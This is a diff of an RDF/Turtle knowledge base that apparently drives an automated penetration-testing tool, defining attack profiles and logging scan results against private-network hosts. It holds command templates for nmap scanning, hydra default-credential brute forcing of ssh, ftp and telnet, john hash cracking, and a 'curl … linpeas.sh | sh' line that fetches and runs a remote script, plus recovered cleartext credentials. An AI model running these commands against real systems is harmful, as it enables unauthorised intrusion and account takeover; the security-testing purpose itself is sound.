@@ -3,68 +3,51 @@
 @prefix xsd: <http://www.w3.org/2001/XMLSchema#> .
 
 ns2:IpAddress1 a ns2:IpAddress ;
-    ns2:addressPort ns2:Port1,
-        ns2:Port2 ;
-    ns2:ipv4 "192.168.0.106" .
+    ns2:addressPort ns2:Port1 ;
+    ns2:ipv4 "192.168.0.102" .
 
-ns2:Scan1 a ns2:Scan ;
-    ns2:command "b'nmap -sC -sV -p- 192.168.0.106'" ;
-    ns2:duration 1.808409e+04 ;
-    ns2:epochTime 1.680084e+09 ;
-    ns2:executionTime "12:00 29/03/2023" ;
-    ns2:resultScore 2.110594e+00 ;
-    ns2:scanInfo ns2:Port1,
-        ns2:Port2,
-        ns2:Service1,
-        ns2:Service2,
-        ns1:Profile6 .
-
-ns2:Scan2 a ns2:Scan ;
-    ns2:command "b'hydra -C wordlists/default_credentials/test.txt ssh://192.168.0.106:22'" ;
-    ns2:duration 1.22104e+03 ;
-    ns2:epochTime 1.680084e+09 ;
-    ns2:executionTime "12:00 29/03/2023" ;
-    ns2:resultScore 1.818977e+00 ;
-    ns2:scanInfo ns2:Account1,
-        ns2:Password1,
-        ns2:Port1,
-        ns2:Service1,
-        ns1:Profile7 .
-
-ns2:Scan3 a ns2:Scan ;
-    ns2:command "b'nmap -F 192.168.0.106'" ;
-    ns2:duration 7.783e+01 ;
-    ns2:epochTime 1.680084e+09 ;
-    ns2:executionTime "12:00 29/03/2023" ;
-    ns2:resultScore 1.38485e+01 ;
-    ns2:scanInfo ns2:Port1,
-        ns2:Service1,
-        ns1:Profile5 .
+ns2:Profile1 a ns1:Profile ;
+    ns2:profileName "full_scan",
+        "ssh_attack" .
 
 ns1:Profile1 a ns1:Profile ;
-    ns1:Command "gobuster dir -u http://<ip>:<port>/ -w wordlists/common.txt",
-        "hydra -C wordlists/default_credentials/test.txt ftp://<ip>:<port>",
-        "hydra -C wordlists/default_credentials/test.txt ssh://<ip>:<port>",
-        "hydra -C wordlists/default_credentials/test.txt telnet://<ip>:<port> " ;
+    ns1:Command "gobuster dir -u http://<ip>:<port>/ -w wordlists/common.txt" ;
     ns1:hasRequirement ns1:Requirement1,
         ns1:Requirement2 ;
-    ns1:hasResult ns1:Result1,
-        ns1:Result5,
-        ns1:Result7 ;
-    ns1:profileName "ftp_attack",
-        "http_dir_scan_small",
-        "ssh_attack",
-        "telnet_attack" .
+    ns1:hasResult ns1:Result1 ;
+    ns1:profileName "http_dir_scan_small" .
 
 ns1:Profile10 a ns1:Profile ;
-    ns1:Command "sshpass -p <Password> ssh <Username>@<Ip>",
-        "sshpass -p <password> ssh <account>@<ip>",
-        "sshpass -p <password> ssh <ip>@<account>" ;
+    ns1:Command "sshpass -p <password> ssh <account>@<ip>" ;
     ns1:hasRequirement ns1:Requirement1,
         ns1:Requirement10,
         ns1:Requirement9 ;
     ns1:hasResult ns1:Result6 ;
     ns1:profileName "ssh_connection" .
+
+ns1:Profile11 a ns1:Profile ;
+    ns1:Command "hydra -C wordlists/default_credentials/test.txt ssh://<ip>:<port>" ;
+    ns1:hasRequirement ns1:Requirement1,
+        ns1:Requirement11 ;
+    ns1:hasResult ns1:Result5,
+        ns1:Result7 ;
+    ns1:profileName "ssh_attack" .
+
+ns1:Profile12 a ns1:Profile ;
+    ns1:Command "hydra -C wordlists/default_credentials/test.txt ftp://<ip>:<port>" ;
+    ns1:hasRequirement ns1:Requirement1,
+        ns1:Requirement12 ;
+    ns1:hasResult ns1:Result5,
+        ns1:Result7 ;
+    ns1:profileName "ftp_attack" .
+
+ns1:Profile13 a ns1:Profile ;
+    ns1:Command "hydra -C wordlists/default_credentials/test.txt telnet://<ip>:<port> " ;
+    ns1:hasRequirement ns1:Requirement1,
+        ns1:Requirement13 ;
+    ns1:hasResult ns1:Result5,
+        ns1:Result7 ;
+    ns1:profileName "telnet_attack" .
 
 ns1:Profile2 a ns1:Profile ;
     ns1:Command "gobuster dir -u https://<ip>:<port>/ -w wordlists/common.txt" ;
@@ -87,26 +70,37 @@ ns1:Profile4 a ns1:Profile ;
     ns1:hasResult ns1:Result1 ;
     ns1:profileName "https_dir_scan_big" .
 
+ns1:Profile5 a ns1:Profile ;
+    ns1:Command "nmap -F <ip>" ;
+    ns1:hasRequirement ns1:Requirement1 ;
+    ns1:hasResult ns1:Result2,
+        ns1:Result3 ;
+    ns1:profileName "fast_scan" .
+
+ns1:Profile6 a ns1:Profile ;
+    ns1:Command "nmap -sC -sV -p- <ip>" ;
+    ns1:hasRequirement ns1:Requirement1 ;
+    ns1:hasResult ns1:Result2,
+        ns1:Result3 ;
+    ns1:profileName "full_scan" .
+
+ns1:Profile7 a ns1:Profile ;
+    ns1:Command "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" ;
+    ns1:hasRequirement ns1:Requirement6 ;
+    ns1:profileName "linpeas" .
+
 ns1:Profile8 a ns1:Profile ;
-    ns1:Command "",
-        "hydra -C wordlists/default_credentials/test.txt ftp://<ip>:<port>" ;
-    ns1:hasRequirement ns1:Requirement1,
-        ns1:Requirement7 ;
+    ns1:Command "" ;
+    ns1:hasRequirement ns1:Requirement7 ;
     ns1:hasResult ns1:Result4,
         ns1:Result5 ;
-    ns1:profileName "firmware_analysis",
-        "ftp_attack" .
+    ns1:profileName "firmware_analysis" .
 
 ns1:Profile9 a ns1:Profile ;
-    ns1:Command "echo <Hash> > pass; john pass --wordlist=/usr/share/wordlist/rockyou.txt ;john --show pass",
-        "echo <hash> > pass; john pass --wordlist=/usr/share/wordlist/rockyou.txt ;john --show pass",
-        "hydra -C wordlists/default_credentials/test.txt telnet://<ip>:<port> " ;
-    ns1:hasRequirement ns1:Requirement1,
-        ns1:Requirement8 ;
-    ns1:hasResult ns1:Result4,
-        ns1:Result5 ;
-    ns1:profileName "crack_hash",
-        "telnet_attack" .
+    ns1:Command "echo <hash> > pass; john pass --wordlist=/usr/share/wordlist/rockyou.txt ;john --show pass" ;
+    ns1:hasRequirement ns1:Requirement8 ;
+    ns1:hasResult ns1:Result5 ;
+    ns1:profileName "crack_hash" .
 
 ns1:Tool1 a ns1:Tool ;
     ns1:toolName "gobuster" ;
@@ -117,8 +111,7 @@ ns1:Tool2 a ns1:Tool ;
     ns1:version "" .
 
 ns1:Tool3 a ns1:Tool ;
-    ns1:toolName "hydra",
-        "linpeas" ;
+    ns1:toolName "linpeas" ;
     ns1:version "" .
 
 ns1:Tool4 a ns1:Tool ;
@@ -137,34 +130,71 @@ ns1:Tool7 a ns1:Tool ;
     ns1:toolName "hydra" ;
     ns1:version "" .
 
-ns1:Profile5 a ns1:Profile ;
-    ns1:Command "nmap -F <ip>" ;
-    ns1:hasRequirement ns1:Requirement1 ;
-    ns1:hasResult ns1:Result2,
-        ns1:Result3 ;
-    ns1:profileName "fast_scan" .
+ns2:Account1 a ns2:Account ;
+    ns2:accountPassword ns2:Password1 ;
+    ns2:accountUsername "client" ;
+    ns2:scanInfo ns2:Scan2,
+        ns2:Scan3,
+        ns2:Scan4,
+        ns2:Scan5 .
 
-ns1:Profile6 a ns1:Profile ;
-    ns1:Command "nmap -sC -sV -p- <ip>" ;
-    ns1:hasRequirement ns1:Requirement1 ;
-    ns1:hasResult ns1:Result2,
-        ns1:Result3 ;
-    ns1:profileName "full_scan" .
+ns2:Account2 a ns2:Account ;
+    ns2:accountPassword ns2:Password2 ;
+    ns2:accountUsername "manager" ;
+    ns2:scanInfo ns2:Scan2,
+        ns2:Scan3,
+        ns2:Scan4,
+        ns2:Scan5 .
 
-ns1:Profile7 a ns1:Profile ;
-    ns1:Command "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
-        "hydra -C wordlists/default_credentials/test.txt ssh://<ip>:<port>" ;
-    ns1:hasRequirement ns1:Requirement1,
-        ns1:Requirement6 ;
-    ns1:hasResult ns1:Result4,
-        ns1:Result5 ;
-    ns1:profileName "linpeas",
-        "ssh_attack" .
+ns2:Password1 a ns2:Password ;
+    ns2:passwordCleartext "devpass" ;
+    ns2:scanInfo ns2:Scan2,
+        ns2:Scan3,
+        ns2:Scan4,
+        ns2:Scan5 .
+
+ns2:Password2 a ns2:Password ;
+    ns2:passwordCleartext "password1" ;
+    ns2:scanInfo ns2:Scan2,
+        ns2:Scan3,
+        ns2:Scan4,
+        ns2:Scan5 .
+
+ns2:Port1 a ns2:Port ;
+    ns2:portNumber "22" ;
+    ns2:portService ns2:Service1 ;
+    ns2:portStatus "open" ;
+    ns2:scanInfo ns2:Scan1,
+        ns2:Scan2,
+        ns2:Scan3,
+        ns2:Scan4,
+        ns2:Scan5 .
+
+ns2:Service1 a ns2:Service ;
+    ns2:scanInfo ns2:Scan1,
+        ns2:Scan2,
+        ns2:Scan3,
+        ns2:Scan4,
+        ns2:Scan5 ;
+    ns2:serviceAccount ns2:Account1,
+        ns2:Account2 ;
+    ns2:serviceName "ssh" .
 
 ns1:Requirement10 a ns1:Requirement ;
-    ns1:requirement "password",
-        "passwordCleartext" ;
+    ns1:requirement "password" ;
     ns1:value "Password" .
+
+ns1:Requirement11 a ns1:Requirement ;
+    ns1:requirement "deviceServices" ;
+    ns1:value "['Ip', 'Port', 'ssh']" .
+
+ns1:Requirement12 a ns1:Requirement ;
+    ns1:requirement "deviceServices" ;
+    ns1:value "['Ip', 'Port', 'ftp']" .
+
+ns1:Requirement13 a ns1:Requirement ;
+    ns1:requirement "deviceServices" ;
+    ns1:value "['Ip', 'Port', 'telnet']" .
 
 ns1:Requirement2 a ns1:Requirement ;
     ns1:requirement "deviceServices" ;
@@ -183,50 +213,31 @@ ns1:Requirement5 a ns1:Requirement ;
     ns1:value "['Ip', 'Port', 'https']" .
 
 ns1:Requirement6 a ns1:Requirement ;
-    ns1:requirement "deviceServices",
-        "shell" ;
-    ns1:value "Shell",
-        "['Ip', 'Port', 'ssh']",
-        "connection" .
+    ns1:requirement "shell" ;
+    ns1:value "connection" .
 
 ns1:Requirement7 a ns1:Requirement ;
-    ns1:requirement "deviceServices",
-        "firmware" ;
-    ns1:value "Firmware",
-        "['Ip', 'Port', 'ftp']" .
+    ns1:requirement "firmware" ;
+    ns1:value "Firmware" .
 
 ns1:Requirement8 a ns1:Requirement ;
-    ns1:requirement "deviceServices",
-        "hash" ;
-    ns1:value "Hash",
-        "['Ip', 'Port', 'telnet']" .
+    ns1:requirement "passwordHash" ;
+    ns1:value "Hash" .
 
 ns1:Requirement9 a ns1:Requirement ;
-    ns1:requirement "account",
-        "accountUsername" ;
+    ns1:requirement "account" ;
     ns1:value "Username" .
 
+ns1:Result4 a ns1:Result ;
+    ns1:result "username" .
+
 ns1:Result6 a ns1:Result ;
-    ns1:result "connection",
-        "shell" .
+    ns1:result "connection" .
 
-ns1:Result7 a ns1:Result ;
-    ns1:result "account" .
-
-ns2:Account1 a ns2:Account ;
-    ns2:accountPassword ns2:Password1 ;
-    ns2:accountUsername "testuserdemo" .
-
-ns2:Password1 a ns2:Password ;
-    ns2:passwordCleartext "Azerty123!" .
-
-ns2:Port2 a ns2:Port ;
-    ns2:portNumber "44321" ;
-    ns2:portService ns2:Service2 ;
-    ns2:portStatus "open" .
-
-ns2:Service2 a ns2:Service ;
-    ns2:serviceName "pmcd?" .
+ns2:Scan1 a ns2:Scan ;
+    ns2:command "b'nmap -sC -sV -p- 192.168.0.102'" ;
+    ns2:executionTime "14:36 08/04/2023" ;
+    ns2:resultScore 1.066893e+00 .
 
 ns1:Result2 a ns1:Result ;
     ns1:result "port" .
@@ -234,18 +245,8 @@ ns1:Result2 a ns1:Result ;
 ns1:Result3 a ns1:Result ;
     ns1:result "service" .
 
-ns1:Result4 a ns1:Result ;
-    ns1:result "account",
-        "username" .
-
-ns2:Port1 a ns2:Port ;
-    ns2:portNumber "22" ;
-    ns2:portService ns2:Service1 ;
-    ns2:portStatus "open" .
-
-ns2:Service1 a ns2:Service ;
-    ns2:serviceAccount ns2:Account1 ;
-    ns2:serviceName "ssh" .
+ns1:Result7 a ns1:Result ;
+    ns1:result "account" .
 
 ns1:Result1 a ns1:Result ;
     ns1:result "webpage" .
@@ -253,11 +254,27 @@ ns1:Result1 a ns1:Result ;
 ns1:Result5 a ns1:Result ;
     ns1:result "password" .
 
+ns2:Scan2 a ns2:Scan ;
+    ns2:command "b'hydra -C wordlists/default_credentials/test.txt ssh://192.168.0.102:22'" ;
+    ns2:executionTime "14:36 08/04/2023" ;
+    ns2:resultScore 3.51875e+00 .
+
+ns2:Scan3 a ns2:Scan ;
+    ns2:command "b'hydra -C wordlists/default_credentials/test.txt ssh://192.168.0.102:22'" ;
+    ns2:executionTime "14:36 08/04/2023" ;
+    ns2:resultScore 3.469142e+00 .
+
+ns2:Scan4 a ns2:Scan ;
+    ns2:command "b'hydra -C wordlists/default_credentials/test.txt ssh://192.168.0.102:22'" ;
+    ns2:executionTime "14:36 08/04/2023" ;
+    ns2:resultScore 3.490926e+00 .
+
+ns2:Scan5 a ns2:Scan ;
+    ns2:command "b'hydra -C wordlists/default_credentials/test.txt ssh://192.168.0.102:22'" ;
+    ns2:executionTime "14:36 08/04/2023" ;
+    ns2:resultScore 3.475785e+00 .
+
 ns1:Requirement1 a ns1:Requirement ;
-    ns1:requirement "deviceServices",
-        "ip" ;
-    ns1:value "Ip",
-        "['Ip', 'Port', 'ftp']",
-        "['Ip', 'Port', 'ssh']",
-        "['Ip', 'Port', 'telnet']" .
+    ns1:requirement "ip" ;
+    ns1:value "Ip" .
 
